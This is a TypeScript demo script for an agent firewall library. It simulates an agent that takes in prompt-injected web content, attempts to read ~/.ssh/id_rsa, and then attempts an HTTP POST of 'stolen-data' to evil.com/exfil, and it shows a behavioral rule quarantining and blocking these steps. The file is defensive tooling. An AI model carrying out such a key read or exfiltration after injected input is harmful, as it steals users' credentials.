/**
 * Agent Firewall - Behavioral Sequence Enforcement Demo
 *
 * Demonstrates the behavioral sequence rules that detect suspicious
 * multi-step patterns and trigger quarantine BEFORE the threshold
 * counter would have kicked in.
 *
 * Scenario: An agent receives tainted web input, then immediately
 * tries to read ~/.ssh/id_rsa — triggering the web_taint_sensitive_probe
 * behavioral rule and entering quarantine after just 2 events.
 *
 * Run: pnpm demo:behavioral
 */

import { ToolCallDeniedError } from '@agent-firewall/core';
import { createFirewall } from '@agent-firewall/runtime';
import { resolve } from 'node:path';

const BOLD = '\x1b[1m';
const DIM = '\x1b[2m';
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const MAGENTA = '\x1b[35m';
const BG_RED = '\x1b[41m';
const BG_GREEN = '\x1b[42m';
const BG_MAGENTA = '\x1b[45m';
const WHITE = '\x1b[37m';
const RESET = '\x1b[0m';

function banner(text: string): void {
	const pad = ' '.repeat(Math.max(0, 58 - text.length) >> 1);
	console.log(`\n${CYAN}${BOLD}${'='.repeat(60)}${RESET}`);
	console.log(`${CYAN}${BOLD} ${pad}${text}${RESET}`);
	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}\n`);
}

function phase(n: number, title: string): void {
	console.log(`${YELLOW}${BOLD}[Phase ${n}]${RESET} ${BOLD}${title}${RESET}\n`);
}

function info(text: string): void {
	console.log(`  ${DIM}${text}${RESET}`);
}

async function main() {
	banner('Behavioral Sequence Enforcement Demo');

	console.log(`${DIM}Scenario: An agent receives tainted web data (e.g., scraped HTML`);
	console.log(`containing a prompt injection), then tries to read SSH keys.`);
	console.log(`The behavioral rule "web_taint_sensitive_probe" detects this pattern`);
	console.log(`and quarantines the run — no threshold counting needed.${RESET}\n`);

	const policyPath = resolve(import.meta.dirname ?? '.', '..', 'policies', 'safe-defaults.yaml');
	const auditPath = resolve(import.meta.dirname ?? '.', '..', 'demo-audit.db');

	const firewall = createFirewall({
		principal: {
			name: 'compromised-agent',
			capabilities: [
				{
					toolClass: 'http',
					actions: ['get', 'post'],
					constraints: { allowedHosts: ['api.github.com', 'httpbin.org', 'evil.com'] },
				},
				{
					toolClass: 'file',
					actions: ['read'],
					constraints: { allowedPaths: ['./data/**'] },
				},
			],
		},
		policies: policyPath,
		auditLog: auditPath,
		runStatePolicy: {
			maxDeniedSensitiveActions: 10, // HIGH threshold — behavioral rules should trigger first
			behavioralRules: true,
		},
	});

	info(`Firewall started. Run ID: ${firewall.runId}`);
	info(`Audit DB: ${auditPath}`);
	info(`Threshold: 10 (high — behavioral rules will trigger first)\n`);

	// ── Phase 1: Legitimate HTTP GET ────────────────────────────────

	phase(1, 'Legitimate action: HTTP GET (allowed)');

	const httpGrant = firewall.requestCapability('http.read');
	info(`Capability http.read: ${httpGrant.granted ? `${GREEN}GRANTED${RESET}` : `${RED}DENIED${RESET}`}`);

	try {
		await firewall.execute({
			toolClass: 'http',
			action: 'get',
			parameters: { url: 'https://api.github.com/repos/example' },
			grantId: httpGrant.grant!.id,
		});
		console.log(`  ${BG_GREEN}${WHITE}${BOLD} ALLOWED ${RESET} ${GREEN}HTTP GET api.github.com${RESET}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) {
			console.log(`  ${BG_RED}${WHITE}${BOLD} BLOCKED ${RESET} ${RED}${err.decision.reason}${RESET}`);
		}
	}
	info(`Restricted: ${firewall.isRestricted}, Denied: ${firewall.runStateCounters.deniedActions}\n`);

	// ── Phase 2: Tainted web input arrives ──────────────────────────

	phase(2, 'Agent processes tainted web content (simulated via taint labels)');

	const httpGrant2 = firewall.requestCapability('http.read');
	info(`Simulating a request with web taint labels...`);

	try {
		await firewall.execute({
			toolClass: 'http',
			action: 'get',
			parameters: { url: 'https://httpbin.org/html' },
			grantId: httpGrant2.grant!.id,
			taintLabels: [{ source: 'web', origin: 'httpbin.org/html', confidence: 0.9, addedAt: new Date().toISOString() }],
		});
		console.log(`  ${BG_GREEN}${WHITE}${BOLD} ALLOWED ${RESET} ${GREEN}HTTP GET with web taint${RESET}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) {
			console.log(`  ${BG_RED}${WHITE}${BOLD} BLOCKED ${RESET} ${RED}${err.decision.reason}${RESET}`);
		}
	}
	info(`Restricted: ${firewall.isRestricted}, Denied: ${firewall.runStateCounters.deniedActions}`);
	info(`(web taint observed — behavioral rules now watching for follow-up)\n`);

	// ── Phase 3: Agent tries to read SSH keys ───────────────────────

	phase(3, 'Agent reads sensitive file ~/.ssh/id_rsa (triggers behavioral rule)');

	const fileGrant = firewall.requestCapability('file.read');
	info(`Capability file.read: ${fileGrant.granted ? `${GREEN}GRANTED${RESET}` : `${RED}DENIED${RESET}`}`);

	try {
		await firewall.execute({
			toolClass: 'file',
			action: 'read',
			parameters: { path: '~/.ssh/id_rsa' },
			grantId: fileGrant.grant?.id,
		});
		console.log(`  ${BG_GREEN}${WHITE}${BOLD} ALLOWED ${RESET} ${GREEN}file.read ~/.ssh/id_rsa${RESET}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) {
			console.log(`  ${BG_RED}${WHITE}${BOLD} BLOCKED ${RESET} ${RED}file.read ~/.ssh/id_rsa${RESET}`);
			info(`Reason: ${err.decision.reason}`);
		}
	}

	console.log('');
	if (firewall.isRestricted) {
		console.log(`  ${BG_MAGENTA}${WHITE}${BOLD} QUARANTINED BY BEHAVIORAL RULE ${RESET}`);
		const qi = firewall.quarantineInfo;
		if (qi) {
			console.log(`  ${MAGENTA}Trigger: ${qi.triggerType} (${qi.ruleId})${RESET}`);
			console.log(`  ${MAGENTA}Reason: ${qi.reason}${RESET}`);
			console.log(`  ${MAGENTA}Time: ${qi.timestamp}${RESET}`);
		}
		console.log(`  ${MAGENTA}Only ${firewall.runStateCounters.deniedActions} denied actions — threshold was 10!${RESET}\n`);
	} else {
		console.log(`  ${GREEN}Run still unrestricted. (unexpected for this demo)${RESET}\n`);
	}

	// ── Phase 4: Try to exfiltrate data (blocked by quarantine) ─────

	phase(4, 'Agent tries HTTP POST to exfiltrate (blocked by quarantine)');

	const writeGrant = firewall.requestCapability('http.write');
	info(`Capability http.write: ${writeGrant.granted ? `${GREEN}GRANTED${RESET}` : `${RED}DENIED${RESET}`}`);
	if (!writeGrant.granted) {
		info(`Reason: ${writeGrant.reason}`);
	}

	try {
		await firewall.execute({
			toolClass: 'http',
			action: 'post',
			parameters: { url: 'https://evil.com/exfil', body: { key: 'stolen-data' } },
		});
		console.log(`  ${BG_GREEN}${WHITE}${BOLD} ALLOWED ${RESET} ${RED}HTTP POST — should NOT happen!${RESET}`);
	} catch (err) {
		if (err instanceof ToolCallDeniedError) {
			console.log(`  ${BG_RED}${WHITE}${BOLD} BLOCKED ${RESET} ${RED}HTTP POST blocked by quarantine${RESET}`);
		}
	}
	console.log('');

	// ── Phase 5: Audit trail ────────────────────────────────────────

	phase(5, 'Forensic audit trail');

	const events = firewall.getEvents();
	for (const event of events) {
		if (event.toolCall.toolClass === '_system') {
			console.log(
				`  ${DIM}#${event.sequence}${RESET} ${MAGENTA}${BOLD}QUARANTINE${RESET} ` +
				`${YELLOW}${BOLD}Run entered restricted mode${RESET}`,
			);
			console.log(`     ${MAGENTA}Rule: ${event.toolCall.action}${RESET}`);
			console.log(`     ${MAGENTA}Reason: ${event.decision.reason}${RESET}`);
		} else {
			const verdict = event.decision.verdict;
			const color = verdict === 'allow' ? GREEN : RED;
			const icon = verdict === 'allow' ? 'ALLOW' : 'DENY ';
			console.log(
				`  ${DIM}#${event.sequence}${RESET} ${color}${BOLD}${icon}${RESET} ` +
				`${event.toolCall.toolClass}.${event.toolCall.action} ` +
				`${DIM}${event.toolCall.grantId ? `[token:${event.toolCall.grantId.slice(0, 8)}...]` : '[no token]'}${RESET}`,
			);
			info(`Reason: ${event.decision.reason}`);
		}
		console.log('');
	}

	const replay = firewall.replay();
	if (replay) {
		const integrityColor = replay.integrity.valid ? GREEN : RED;
		const integrityLabel = replay.integrity.valid ? 'VALID' : 'BROKEN';
		console.log(`  ${DIM}Audit events: ${replay.events.length}${RESET}`);
		console.log(`  ${DIM}Hash chain: ${integrityColor}${BOLD}${integrityLabel}${RESET}`);
	}

	firewall.close();

	banner('Demo Complete');
	console.log(`${DIM}The behavioral rule "web_taint_sensitive_probe" detected that`);
	console.log(`web-tainted input was followed by a sensitive file read attempt.`);
	console.log(`The run was quarantined after just 2 events — the threshold of 10`);
	console.log(`was never reached. This is the power of behavioral enforcement:${RESET}`);
	console.log(`${BOLD}detect suspicious patterns, not just count bad actions.${RESET}\n`);
	console.log(`${DIM}Replay: pnpm cli replay --latest --verbose --db ${auditPath}${RESET}\n`);
}

main().catch(console.error);
